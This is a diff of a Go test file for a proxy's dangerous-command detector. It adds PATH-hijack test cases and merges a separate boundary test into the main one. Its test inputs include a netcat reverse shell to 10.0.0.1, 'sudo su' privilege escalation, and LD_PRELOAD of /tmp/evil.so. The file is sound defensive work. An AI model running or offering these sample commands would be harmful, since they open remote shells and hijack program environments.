@@ -4,7 +4,7 @@ import (
 	"strings"
 	"testing"
 
-	"github.com/insistanan/api-proxy/internal/infra/config"
+	"insistanan/api-proxy/internal/infra/config"
 )
 
 func TestCmdDetectorOnlyMatchesExecutableContexts(t *testing.T) {
@@ -23,6 +23,8 @@ func TestCmdDetectorOnlyMatchesExecutableContexts(t *testing.T) {
 		{name: "反弹Shell", text: "```sh\nnc -e /bin/sh 10.0.0.1 4444\n```", rule: config.DangerousCmdRuleReverseShell},
 		{name: "权限提升", text: "```sh\nsudo su\n```", rule: config.DangerousCmdRulePrivilegeEscalation},
 		{name: "环境篡改", text: "```sh\nLD_PRELOAD=/tmp/evil.so app\n```", rule: config.DangerousCmdRuleEnvironmentTampering},
+		{name: "PATH 劫持到当前目录", text: "```sh\nPATH=.:$PATH command\n```", rule: config.DangerousCmdRuleEnvironmentTampering},
+		{name: "PATH 劫持到临时目录", text: "```sh\nPATH=/tmp/bin:$PATH command\n```", rule: config.DangerousCmdRuleEnvironmentTampering},
 	}
 
 	for _, test := range tests {
@@ -42,36 +44,10 @@ func TestCmdDetectorOnlyMatchesExecutableContexts(t *testing.T) {
 		"```sh\ndd if=/dev/zero of=sample.bin bs=1M count=1\n```",
 		"```sh\ndd if=/dev/zero of=/dev/null\n```",
 		"```sh\nLD_PRELOAD=/usr/lib/libasan.so app\n```",
-	} {
-		if matches := detector.Find(text); len(matches) != 0 {
-			t.Fatalf("普通文本不应命中 %q: %+v", text, matches)
-		}
-	}
-}
-
-func TestCmdDetectorEnvironmentTamperingBoundaries(t *testing.T) {
-	detector, err := NewCmdDetector(defaultDangerousCmdSettings())
-	if err != nil {
-		t.Fatalf("创建检测器失败: %v", err)
-	}
-
-	for _, text := range []string{
-		"```sh\nPATH=.:$PATH command\n```",
-		"```sh\nPATH=/tmp/bin:$PATH command\n```",
-		"```sh\nLD_PRELOAD=/tmp/evil.so app\n```",
-	} {
-		matches := detector.Find(text)
-		if len(matches) == 0 || matches[0].Rule != config.DangerousCmdRuleEnvironmentTampering {
-			t.Fatalf("明显的环境劫持应命中 %q: %+v", text, matches)
-		}
-	}
-
-	for _, text := range []string{
-		"```sh\nexport PATH=$PATH:/usr/local/bin\n```",
 		"```sh\nPATH=/usr/local/bin:/usr/bin\n```",
 	} {
 		if matches := detector.Find(text); len(matches) != 0 {
-			t.Fatalf("正常 PATH 配置不应命中 %q: %+v", text, matches)
+			t.Fatalf("普通文本不应命中 %q: %+v", text, matches)
 		}
 	}
 }
@@ -191,7 +167,7 @@ func TestStreamCmdScannerKeepsCompleteLargeContext(t *testing.T) {
 	}
 	match, blocked := oversized.Feed("```")
 	if !blocked || match == nil || !strings.Contains(match.Command, largeContext) {
-		t.Fatal("超过旧 256 KiB 限制后仍须检查完整上下文，不能遗漏尾部危险命令")
+		t.Fatal("大上下文必须完整检查，不能遗漏尾部危险命令")
 	}
 }
 
